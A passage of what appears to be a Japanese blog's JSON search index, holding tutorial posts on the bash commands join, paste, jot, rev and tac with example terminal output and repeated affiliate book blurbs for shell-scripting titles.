[改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB\u0026#43;DB PRESS plus) 単行本（ソフトカバー） 2017/1/20 定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。 シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。 本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、 基本から丁寧に解説。 第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。 合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。 ますますパワーアップした改訂版をお届けします。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 新しいシェルプログラミングの教科書 単行本 エキスパートを目指せ!! システム管理やソフトウェア開発など、\n実際の業務では欠かせないシェルスクリプトの知識を徹底解説\nほとんどのディストリビューションでデフォルトとなっているbashに特化することで、\n類書と差別化を図るとともに、より実践的なプログラミングを紹介します。\nまたプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。\nイマドキのエンジニア必携の一冊。\n▼目次\nCHAPTER01 シェルってなんだろう\nCHAPTER02 シェルスクリプトとは何か\nCHAPTER03 シェルスクリプトの基本\nCHAPTER04 変数\nCHAPTER05 クォーティング\nCHAPTER06 制御構造\nCHAPTER07 リダイレクトとパイプ\nCHAPTER08 関数\nCHAPTER09 組み込みコマンド\nCHAPTER10 正規表現と文字列\nCHAPTER11 シェルスクリプトの実行方法\nCHAPTER12 シェルスクリプトのサンプルで学ぼう\nCHAPTER13 シェルスクリプトの実用例\nCHAPTER14 テストとデバッグ\nCHAPTER15 読みやすいシェルスクリプト\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2022-11-08T11:41:56+09:00","image":"https://suzukiiichiro.github.io/posts/2022-11-08-01-column-suzuki/bash_hu5909208fb16d2109d0cdca2186f9358e_33901_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-11-08-01-column-suzuki/","title":"【column】bash/シェルスクリプトマニアックコマンドあれこれ６"},{"content":"joinコマンド join は、2つのテキストファイルの内容を比較し、共通する項目がある行を連結するコマンドです。\n例えば、\n１つ目のテキストファイルに「100 apple」、\n２つ目のテキストファイルに「100 リンゴ」、\nという行があった場合、100 を共通する項目に指定することで、\n「100 apple リンゴ」と出力します。\nオプション無しの場合 join コマンドに何もオプションがない場合、2つのテキストファイルを比較し、先頭（左から数えて1番目）の項目が共通していたら結合して出力します。\n例えば、\n１つ目のテキストファイルに「100 apple」、\n２つ目のファイルには「100 リンゴ」という行があった場合は、\n先頭（左から数えて１番目）の項目を共通項目として連結し、\n「100 apple リンゴ」と出力します。\n共通項の指定 共通しているかどうかの比較に使用する項目は、join -1 および join -2 オプションで変更できます。\n例えば、１つ目のファイルでは“左から数えて３番目の項目”を使いたい場合、join -1 3 のように指定します。\n１つ目、２つ目のファイル両方で３番目の項目を使いたい場合は、join -1 3 -2 3 のように指定するか、join -j 3のように、「-j」オプションでまとめて指定することもできます。\nヒント pasteコマンドしかり、このjoinコマンドも、しらなければプログラムを書いてなんとかなる内容ではありますが、知っているといとも簡単に実現できるわけです。 書籍の紹介 UNIXという考え方—その設計思想と哲学 単行本 2001/2/23 UNIX系のOSは世界で広く使われている。UNIX、Linux、FreeBSD、Solarisなど、商用、非商用を問わず最も普及したOSのひとつであろう。そしてこのOSは30年にわたって使用され続けているものでもある。なぜこれほど長い間使われてきたのか？ その秘密はUNIXに込められた数々の哲学や思想が握っている。 そもそもUNIXはMulticsという巨大なOSの開発から生まれたものだ。あまりに巨大なMulticsはその複雑さゆえに開発は遅々として進まず、その反省からケン・トンプソンが作ったのがUNIXの初めとされる。その後デニス・リッチーら多数の開発者が携わり、UNIXは発展した。本書はこのUNIXに込められた「思想と哲学」を抽出し、数々のエピソードとともにUNIXの特徴を浮き彫りにしていく。 たとえば本書で述べられているUNIXの発想のひとつとして「過度の対話式インタフェースを避ける」というものがある。UNIXのシステムは初心者には「不親切」なつくり、つまり親切な対話式のインタフェースはほとんどなく、ユーザーがコマンドを実行しようとするときはオプションをつける形をとっている。この形式はオプションをいちいち覚えねばならず、初心者に決してやさしくない。しかしこれはプログラムを小さく単純なものにし、他のプログラムとの結合性を高くする。そして結果としてUNIXのスケーラビリティと移植性の高さを支えることになっているのだ。このような形式で本書では9つの定理と10の小定理を掲げ、UNIXが何を重視し、何を犠牲にしてきたのかを明快に解説している。\n最終章にはMS-DOSなどほかのOSの思想も紹介されている。UNIXの思想が他のOSとどう違うかをはっきり知ることになるだろう。UNIXの本質を理解するうえで、UNIX信者もUNIX初心者にとっても有用な1冊だ。（斎藤牧人）\nAmazonで詳細を見る\nAmazon.co.jpアソシエイトを使用\n詳解 シェルスクリプト 大型本 2006/1/16 Unixのプログラムは「ツール」と呼ばれます。 Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。 そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。 また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。 つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。 本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。 標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、 目的の処理を実現するための方法を詳しく学ぶことができます。 Amazonで詳細を見る Amazon.co.jpアソシエイトを使用 UNIXシェルスクリプト マスターピース132 すべてのUNIXエンジニア必携!! サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。\n知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 [改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB\u0026#43;DB PRESS plus) 単行本（ソフトカバー） 2017/1/20 定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。 シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。 本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、 基本から丁寧に解説。 第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。 合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。 ますますパワーアップした改訂版をお届けします。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 新しいシェルプログラミングの教科書 単行本 エキスパートを目指せ!! システム管理やソフトウェア開発など、\n実際の業務では欠かせないシェルスクリプトの知識を徹底解説\nほとんどのディストリビューションでデフォルトとなっているbashに特化することで、\n類書と差別化を図るとともに、より実践的なプログラミングを紹介します。\nまたプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。\nイマドキのエンジニア必携の一冊。\n▼目次\nCHAPTER01 シェルってなんだろう\nCHAPTER02 シェルスクリプトとは何か\nCHAPTER03 シェルスクリプトの基本\nCHAPTER04 変数\nCHAPTER05 クォーティング\nCHAPTER06 制御構造\nCHAPTER07 リダイレクトとパイプ\nCHAPTER08 関数\nCHAPTER09 組み込みコマンド\nCHAPTER10 正規表現と文字列\nCHAPTER11 シェルスクリプトの実行方法\nCHAPTER12 シェルスクリプトのサンプルで学ぼう\nCHAPTER13 シェルスクリプトの実用例\nCHAPTER14 テストとデバッグ\nCHAPTER15 読みやすいシェルスクリプト\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2022-11-08T11:25:36+09:00","image":"https://suzukiiichiro.github.io/posts/2022-11-08-01-join-suzuki/bash_hu5909208fb16d2109d0cdca2186f9358e_33901_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-11-08-01-join-suzuki/","title":"【join】bash/シェルスクリプトマニアックコマンドあれこれ５"},{"content":"pasteコマンド pasteコマンドは、複数のファイルを行単位で連結するコマンドです。\n$ pasteファイル1 ファイル2 で「ファイル1の1行目とファイル2の1行目」、「ファイル1の2行目とファイル2の2行目」……という行が出力されます。\nExcelに親しんでいる方は、「列のコピー」と考えると動作をイメージしやすいかもしれません。\nファイルの連結 １つ目のファイル\n$ cat emp-number.txt 100 200 300 400 500 ２つ目のファイル\n$ cat emp-firstname.txt Emma Alex Madison Sanjay Nisha ３つ目のファイル\n$ cat emp-lastname.txt Thomas Jason Randy Gupta Singh pasteコマンドで結合\n$ paste emp-number.txt emp-firstname.txt emp-lastname.txt 100 Emma Thomas 200 Alex Jason 300 Madison Randy 400 Sanjay Gupta 500 Nisha Singh ヒント すごい！ 区切り文字を指定する 区切り文字は「-d」オプションで指定します。\n例えば、カンマ（,）区切りで出力したい場合は paste -d, と指定します。\n$ paste -d emp-number.txt emp-firstname.txt emp-lastname.txt 100,Emma,Thomas 200,Alex,Jason 300,Madison,Randy 400,Sanjay,Gupta 500,Nisha,Singh ヒント すごい！！ 行列を入れ替える paste -s （\u0026ndash;serialオプション）で、行列を入れ替えて結合します。\n$ paste -s emp-number.txt emp-firstname.txt emp-lastname.txt 100\t200\t300\t400\t500 Emma Alex Madison Sanjay Nisha Thomas Jason Randy Gupta Singh $ ヒント このオプションを知らなければ、ループしまくりで作ってしまうところですよね。 書籍の紹介 UNIXという考え方—その設計思想と哲学 単行本 2001/2/23 UNIX系のOSは世界で広く使われている。UNIX、Linux、FreeBSD、Solarisなど、商用、非商用を問わず最も普及したOSのひとつであろう。そしてこのOSは30年にわたって使用され続けているものでもある。なぜこれほど長い間使われてきたのか？ その秘密はUNIXに込められた数々の哲学や思想が握っている。 そもそもUNIXはMulticsという巨大なOSの開発から生まれたものだ。あまりに巨大なMulticsはその複雑さゆえに開発は遅々として進まず、その反省からケン・トンプソンが作ったのがUNIXの初めとされる。その後デニス・リッチーら多数の開発者が携わり、UNIXは発展した。本書はこのUNIXに込められた「思想と哲学」を抽出し、数々のエピソードとともにUNIXの特徴を浮き彫りにしていく。 たとえば本書で述べられているUNIXの発想のひとつとして「過度の対話式インタフェースを避ける」というものがある。UNIXのシステムは初心者には「不親切」なつくり、つまり親切な対話式のインタフェースはほとんどなく、ユーザーがコマンドを実行しようとするときはオプションをつける形をとっている。この形式はオプションをいちいち覚えねばならず、初心者に決してやさしくない。しかしこれはプログラムを小さく単純なものにし、他のプログラムとの結合性を高くする。そして結果としてUNIXのスケーラビリティと移植性の高さを支えることになっているのだ。このような形式で本書では9つの定理と10の小定理を掲げ、UNIXが何を重視し、何を犠牲にしてきたのかを明快に解説している。\n最終章にはMS-DOSなどほかのOSの思想も紹介されている。UNIXの思想が他のOSとどう違うかをはっきり知ることになるだろう。UNIXの本質を理解するうえで、UNIX信者もUNIX初心者にとっても有用な1冊だ。（斎藤牧人）\nAmazonで詳細を見る\nAmazon.co.jpアソシエイトを使用\n詳解 シェルスクリプト 大型本 2006/1/16 Unixのプログラムは「ツール」と呼ばれます。 Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。 そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。 また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。 つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。 本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。 標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、 目的の処理を実現するための方法を詳しく学ぶことができます。 Amazonで詳細を見る Amazon.co.jpアソシエイトを使用 UNIXシェルスクリプト マスターピース132 すべてのUNIXエンジニア必携!! サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。\n知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 [改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB\u0026#43;DB PRESS plus) 単行本（ソフトカバー） 2017/1/20 定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。 シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。 本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、 基本から丁寧に解説。 第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。 合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。 ますますパワーアップした改訂版をお届けします。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 新しいシェルプログラミングの教科書 単行本 エキスパートを目指せ!! システム管理やソフトウェア開発など、\n実際の業務では欠かせないシェルスクリプトの知識を徹底解説\nほとんどのディストリビューションでデフォルトとなっているbashに特化することで、\n類書と差別化を図るとともに、より実践的なプログラミングを紹介します。\nまたプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。\nイマドキのエンジニア必携の一冊。\n▼目次\nCHAPTER01 シェルってなんだろう\nCHAPTER02 シェルスクリプトとは何か\nCHAPTER03 シェルスクリプトの基本\nCHAPTER04 変数\nCHAPTER05 クォーティング\nCHAPTER06 制御構造\nCHAPTER07 リダイレクトとパイプ\nCHAPTER08 関数\nCHAPTER09 組み込みコマンド\nCHAPTER10 正規表現と文字列\nCHAPTER11 シェルスクリプトの実行方法\nCHAPTER12 シェルスクリプトのサンプルで学ぼう\nCHAPTER13 シェルスクリプトの実用例\nCHAPTER14 テストとデバッグ\nCHAPTER15 読みやすいシェルスクリプト\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2022-11-08T11:05:39+09:00","image":"https://suzukiiichiro.github.io/posts/2022-11-08-01-paste-suzuki/bash_hu5909208fb16d2109d0cdca2186f9358e_33901_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-11-08-01-paste-suzuki/","title":"【paste】bash/シェルスクリプトマニアックコマンドあれこれ４"},{"content":"jotコマンド 連番を生成する 文字列と組み合わせた連番を作成する printf のフォーマットで出力する 連番の範囲を指定して出力する 乱数を出力する jotコマンド概要 jotコマンドは、連番数字はもちろん、連番付きのアルファベットを生成したり、ランダムな数字を生成したりできます。似たコマンドに seqや$RANDOM コマンドがあります。\njotコマンドの書式 jot [オプション]\njotコマンドの主なオプション オプション 意味 -w [文字列] 文字列を指定する -r 乱数を出力する jotコマンド詳細説明 連番を作る 「jot ファイル名」で、ファイルの中身を並べ替えます。\nさっそく連番を出力してみます。\nまずは10個の連番を出力します。\n$ jot 10 1 2 3 4 5 6 7 8 9 10 seqコマンドではこうなります\n$ seq 10 1 2 3 4 5 6 7 8 9 10 文字列と組み合わせた連番を作成する 文字列 abc に続けて10個の連番を作成します。\n$ jot -w abc 10 abc1 abc2 abc3 abc4 abc5 abc6 abc7 abc8 abc9 abc10 次の項でも説明しますが、seqコマンドでも同様のことができます。\n$ seq -f \u0026#34;%04g\u0026#34; 3 0001 0002 0003 seqコマンドでもprintfフォーマットで出力できますので、文字列と連結した連番の生成もできます。\n$ seq -f \u0026#34;IMG%04g.jpg\u0026#34; 3 IMG0001.jpg IMG0002.jpg IMG0003.jpg では、次の項ではjotコマンドでprintfのフォーマットで出力する方法を具体的に説明します。\nprintf のフォーマットで出力する $ jot -w \u0026#39;name%03d\u0026#39; 10 name001 name002 name003 name004 name005 name006 name007 name008 name009 name010 連番の範囲を指定して出力する 5からの連番を３つ出力します。\n$ jot -w \u0026#39;name%03d\u0026#39; 3 5 name005 name006 name007 10からの連番を５つ出力します。\n$ jot -w \u0026#39;name%03d\u0026#39; 5 10 name010 name011 name012 name013 name014 bash-5.1$ 乱数を出力する 1から10までの乱数を５つ出力します。\n-r 5 は乱数を５つ出力することを示します。\n1 10 は、１から１０までの範囲でといういみとなります。\n1から100までの範囲で乱数を５つ出力すると以下の通りになります。\njot -r 5 1 100 1 6 17 91 46 print文フォーマットで、1から100までの範囲で乱数を５つ出力してみます。\n$ jot -w \u0026#39;name%03d\u0026#39; -r 5 1 10 name008 name006 name007 name001 name006 ヒント 連番を作成する場合はseq、乱数を扱う場合は $RANDOMを使う場合が多いと思いますが、jotコマンドは、seq,$RANDOMを足し合わせて、同等それ以上の実行が可能です。 書籍の紹介 詳解 シェルスクリプト 大型本 2006/1/16 Unixのプログラムは「ツール」と呼ばれます。 Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。 そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。 また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。 つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。 本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。 標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、 目的の処理を実現するための方法を詳しく学ぶことができます。 Amazonで詳細を見る Amazon.co.jpアソシエイトを使用 UNIXシェルスクリプト マスターピース132 すべてのUNIXエンジニア必携!! サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。\n知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 [改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB\u0026#43;DB PRESS plus) 単行本（ソフトカバー） 2017/1/20 定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。 シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。 本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、 基本から丁寧に解説。 第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。 合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。 ますますパワーアップした改訂版をお届けします。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 新しいシェルプログラミングの教科書 単行本 エキスパートを目指せ!! システム管理やソフトウェア開発など、\n実際の業務では欠かせないシェルスクリプトの知識を徹底解説\nほとんどのディストリビューションでデフォルトとなっているbashに特化することで、\n類書と差別化を図るとともに、より実践的なプログラミングを紹介します。\nまたプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。\nイマドキのエンジニア必携の一冊。\n▼目次\nCHAPTER01 シェルってなんだろう\nCHAPTER02 シェルスクリプトとは何か\nCHAPTER03 シェルスクリプトの基本\nCHAPTER04 変数\nCHAPTER05 クォーティング\nCHAPTER06 制御構造\nCHAPTER07 リダイレクトとパイプ\nCHAPTER08 関数\nCHAPTER09 組み込みコマンド\nCHAPTER10 正規表現と文字列\nCHAPTER11 シェルスクリプトの実行方法\nCHAPTER12 シェルスクリプトのサンプルで学ぼう\nCHAPTER13 シェルスクリプトの実用例\nCHAPTER14 テストとデバッグ\nCHAPTER15 読みやすいシェルスクリプト\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2022-11-08T10:40:40+09:00","image":"https://suzukiiichiro.github.io/posts/2022-11-08-01-jot-suzuki/bash_hu5909208fb16d2109d0cdca2186f9358e_33901_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-11-08-01-jot-suzuki/","title":"【jot】Bash/シェルスクリプトマニアックコマンドあれこれ３"},{"content":"rev コマンド すべての行の文字の順序を逆にする\n次の例に示すように、すべての行で文字の順序を逆にします。\ntac コマンドはファイルの各行を上下反転しますが、\nrev コマンドは行の各文字の前後を反転します。\n普通にcatします。\n$ cat thegeekstuff.txt 1. Linux Sysadmin, Scripting etc., 2. Databases Oracle, mySQL etc., 3. Hardware 4. Security (Firewall, Network, Online Security etc) 5. Storage 6. Cool gadgets and websites 7. Productivity (Too many technologies to explore, not much time available) 8. Website Design 9. Software Development 10. Windows Sysadmin, reboot etc., 11. Adding 1\u0026#39;s and 0\u0026#39;s revコマンドを実行した結果\n$ rev thegeekstuff.txt ,.cte gnitpircS ,nimdasyS xuniL .1 ,.cte LQSym ,elcarO sesabataD .2 erawdraH .3 )cte ytiruceS enilnO ,krowteN ,llaweriF( ytiruceS .4 egarotS .5 setisbew dna stegdag looC .6 )elbaliava emit hcum ton ,erolpxe ot seigolonhcet ynam ooT( ytivitcudorP .7 ngiseD etisbeW .8 tnempoleveD erawtfoS .9 ,.cte toober ,nimdasyS swodniW .01 s\u0026#39;0 dna s\u0026#39;1 gniddA .11 「rev」は「cat」と同じく先頭行から順番に表示しますが、表示する文字の並びが行の末尾から逆に並び替えて表示を行います。\nヒント 「rev」は「reverse」の略です。 find の出力結果を拡張子でソート 「rev」コマンドの活用場面を思い浮かべることはできませんでしたが、下記の様にすることで findで検索した結果のファイルを拡張子単位でソートをすることができます。\n$ find . -type f | rev | sort | rev 実行結果\n./file1.c ./dir/file2.c ./dir2file3.c ./header1.h ./header2.h ./dir2/header3.h ./text1.txt ./text2.txt ./dir/text3.txr ドメイン名リストのソート www1・www2 などのサブドメインではなく、example.com や example.net などのドメインでソートしたいとする。\nその場合、rev コマンドで逆順にし、ソートし、再度 rev コマンドで戻すとよい。\nドメイン名リスト\nwww1.example.com www-a.example-b.com www1.example.net www-b.example-b.com www2.example.com www2.example.net 実行結果\n$ cat foo.txt | rev | sort | rev www-a.example-b.com www-b.example-b.com www1.example.com www2.example.com www1.example.net www2.example.net 書籍の紹介 UNIXという考え方—その設計思想と哲学 単行本 2001/2/23 UNIX系のOSは世界で広く使われている。UNIX、Linux、FreeBSD、Solarisなど、商用、非商用を問わず最も普及したOSのひとつであろう。そしてこのOSは30年にわたって使用され続けているものでもある。なぜこれほど長い間使われてきたのか？ その秘密はUNIXに込められた数々の哲学や思想が握っている。 そもそもUNIXはMulticsという巨大なOSの開発から生まれたものだ。あまりに巨大なMulticsはその複雑さゆえに開発は遅々として進まず、その反省からケン・トンプソンが作ったのがUNIXの初めとされる。その後デニス・リッチーら多数の開発者が携わり、UNIXは発展した。本書はこのUNIXに込められた「思想と哲学」を抽出し、数々のエピソードとともにUNIXの特徴を浮き彫りにしていく。 たとえば本書で述べられているUNIXの発想のひとつとして「過度の対話式インタフェースを避ける」というものがある。UNIXのシステムは初心者には「不親切」なつくり、つまり親切な対話式のインタフェースはほとんどなく、ユーザーがコマンドを実行しようとするときはオプションをつける形をとっている。この形式はオプションをいちいち覚えねばならず、初心者に決してやさしくない。しかしこれはプログラムを小さく単純なものにし、他のプログラムとの結合性を高くする。そして結果としてUNIXのスケーラビリティと移植性の高さを支えることになっているのだ。このような形式で本書では9つの定理と10の小定理を掲げ、UNIXが何を重視し、何を犠牲にしてきたのかを明快に解説している。\n最終章にはMS-DOSなどほかのOSの思想も紹介されている。UNIXの思想が他のOSとどう違うかをはっきり知ることになるだろう。UNIXの本質を理解するうえで、UNIX信者もUNIX初心者にとっても有用な1冊だ。（斎藤牧人）\nAmazonで詳細を見る\nAmazon.co.jpアソシエイトを使用\n詳解 シェルスクリプト 大型本 2006/1/16 Unixのプログラムは「ツール」と呼ばれます。 Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。 そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。 また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。 つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。 本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。 標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、 目的の処理を実現するための方法を詳しく学ぶことができます。 Amazonで詳細を見る Amazon.co.jpアソシエイトを使用 UNIXシェルスクリプト マスターピース132 すべてのUNIXエンジニア必携!! サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。\n知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 [改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB\u0026#43;DB PRESS plus) 単行本（ソフトカバー） 2017/1/20 定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。 シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。 本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、 基本から丁寧に解説。 第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。 合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。 ますますパワーアップした改訂版をお届けします。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 新しいシェルプログラミングの教科書 単行本 エキスパートを目指せ!! システム管理やソフトウェア開発など、\n実際の業務では欠かせないシェルスクリプトの知識を徹底解説\nほとんどのディストリビューションでデフォルトとなっているbashに特化することで、\n類書と差別化を図るとともに、より実践的なプログラミングを紹介します。\nまたプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。\nイマドキのエンジニア必携の一冊。\n▼目次\nCHAPTER01 シェルってなんだろう\nCHAPTER02 シェルスクリプトとは何か\nCHAPTER03 シェルスクリプトの基本\nCHAPTER04 変数\nCHAPTER05 クォーティング\nCHAPTER06 制御構造\nCHAPTER07 リダイレクトとパイプ\nCHAPTER08 関数\nCHAPTER09 組み込みコマンド\nCHAPTER10 正規表現と文字列\nCHAPTER11 シェルスクリプトの実行方法\nCHAPTER12 シェルスクリプトのサンプルで学ぼう\nCHAPTER13 シェルスクリプトの実用例\nCHAPTER14 テストとデバッグ\nCHAPTER15 読みやすいシェルスクリプト\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2022-11-08T10:37:14+09:00","image":"https://suzukiiichiro.github.io/posts/2022-11-08-01-rev-suzuki/bash_hu5909208fb16d2109d0cdca2186f9358e_33901_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-11-08-01-rev-suzuki/","title":"【rev】bash/シェルスクリプトマニアックコマンドあれこれ２"},{"content":"tacコマンド tac コマンドはファイルの内容を逆順に出力するコマンドです。\n最後の行が最初に表示されます。\ntac という言葉は、cat という言葉の逆です。\ntacコマンドの機能も、catコマンドの逆です。\n通常のcatコマンドの実行結果\n$ cat thegeekstuff.txt 1. Linux Sysadmin, Scripting etc., 2. Databases Oracle, mySQL etc., 3. Hardware 4. Security (Firewall, Network, Online Security etc) 5. Storage 6. Cool gadgets and websites 7. Productivity (Too many technologies to explore, not much time available) 8. Website Design 9. Software Development 10. Windows Sysadmin, reboot etc., 11. Adding 1\u0026#39;s and 0\u0026#39;s tac コマンドの実行結果\n$ tac thegeekstuff.txt 11. Adding 1\u0026#39;s and 0\u0026#39;s 10. Windows Sysadmin, reboot etc., 9. Software Development 8. Website Design 7. Productivity (Too many technologies to explore, not much time available) 6. Cool gadgets and websites 5. Storage 4. Security (Firewall, Network, Online Security etc) 3. Hardware 2. Databases Oracle, mySQL etc., 1. Linux Sysadmin, Scripting etc., 単語を逆順に並べるには -s というオプションで区切り文字を指定できるので、行ではなく単語を逆順に並べることもできる。\n$ echo -n \u0026#34;I\u0026#39;m feeling lucky.\u0026#34; | tac -s \u0026#39; \u0026#39; lucky.feeling I\u0026#39;m さらに -r というオプションを使えば正規表現で区切り文字を指定できる。\n$ echo -n \u0026#34;I\u0026#39;m feeling lucky.\u0026#34; | tac -r -s \u0026#39;[^a-zA-Z]\u0026#39; lucky.feeling m I\u0026#39; catコマンドと同様の書式でファイルの結合 ２つのファイルがあります。\n$ cat file_name1 abcde fghij klmno $ cat file_name2 pqrst uvwxy z1234 ２つのファイルをtacで結合すると以下の通りになります。\n$ tac file_name1 file_name2 klmno fghij abcde z1234 uvwxy pqrst tacでファイルを結合する場合は、各ファイルごとに最終行から逆に並べ替えた上で結合を行います。\nこのときの結果は、下記の様に catで結合した上で tacコマンドで並び替えたときの結果とは異なります。\n$ cat file_name1 file_name2 | tac z1234 uvwxy pqrst klmno fghij abcde ヒント どちらでも良いのではなく、後者を覚えましょう。 結合したファイルをファイルに出力 また、結合したファイルをファイルに出力する場合は、リダイレクトを使用します。\n$ cat file_name1 file_name2 | tac \u0026gt; file_name3 こうすると、実行内容を画面に表示しながらファイルに出力できますね。\n$ cat file_name1 file_name2 | tac | tee file_name3 tacコマンドには行番号を表示するオプションがない catコマンドには行番号を表示する「-n」オプションがありますが、「tac」コマンドにはこれに類似するオプションはありません。\nそのため、行番号を表示する場合は、下記の様に catコマンドか、nlコマンドを併用します。\ncat -n または、nl こまんどで行番号を振ります！\n$ tac file_name1 | cat -n $ tac file_name1 | nl 書籍の紹介 UNIXという考え方—その設計思想と哲学 単行本 2001/2/23 UNIX系のOSは世界で広く使われている。UNIX、Linux、FreeBSD、Solarisなど、商用、非商用を問わず最も普及したOSのひとつであろう。そしてこのOSは30年にわたって使用され続けているものでもある。なぜこれほど長い間使われてきたのか？ その秘密はUNIXに込められた数々の哲学や思想が握っている。 